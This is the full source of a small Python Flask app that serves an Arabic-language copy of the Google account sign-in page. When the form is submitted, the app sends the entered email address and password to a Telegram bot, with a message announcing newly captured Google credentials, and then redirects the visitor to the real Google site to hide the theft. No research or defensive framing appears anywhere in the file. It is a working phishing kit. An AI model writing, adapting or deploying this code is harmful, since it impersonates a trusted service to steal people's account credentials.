import os
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  email_val = ""
  if request.method == "POST":
    email_val = request.form.get("email", "").strip()
    password = request.form.get("password", "")

    if not email_val or len(password) < 1:
      error = "الرجاء إدخال البريد الإلكتروني وكلمة المرور بشكل صحيح."
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Google جديدة:\n\n📧 البريد:"
            f" {email_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(GOOGLE_OFFICIAL_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background: #fff; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; }
        
        .login-card {
            width: 100%;
            max-width: 450px;
            padding: 40px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .google-logo {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .google-logo span span:nth-child(1) { color: #4285F4; }
        .google-logo span span:nth-child(2) { color: #EA4335; }
        .google-logo span span:nth-child(3) { color: #FBBC05; }
        .google-logo span span:nth-child(4) { color: #4285F4; }
        .google-logo span span:nth-child(5) { color: #34A853; }
        .google-logo span span:nth-child(6) { color: #EA4335; }

        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 30px; }

        .error-msg { color: #d93025; font-size: 13px; margin-bottom: 15px; width: 100%; text-align: right; }

        .input-group { width: 100%; margin-bottom: 15px; }
        .input-group input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            color: #202124;
        }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 14px; }

        .submit-btn {
            width: 100%;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }
        .submit-btn:hover { background: #1558b0; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="google-logo">
            <span>
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </span>
        </div>
        <div class="subtitle">تسجيل الدخول باستخدام حسابك على Google</div>

        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form method="POST" style="width: 100%;">
            <div class="input-group">
                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف" value="{{ email_val }}">
            </div>
            <div class="input-group">
                <input type="password" name="password" required placeholder="إدخال كلمة المرور">
            </div>
            <button type="submit" class="submit-btn">التالي</button>
        </form>
    </div>
</body>
</html>
""",
      error=error,
      email_val=email_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
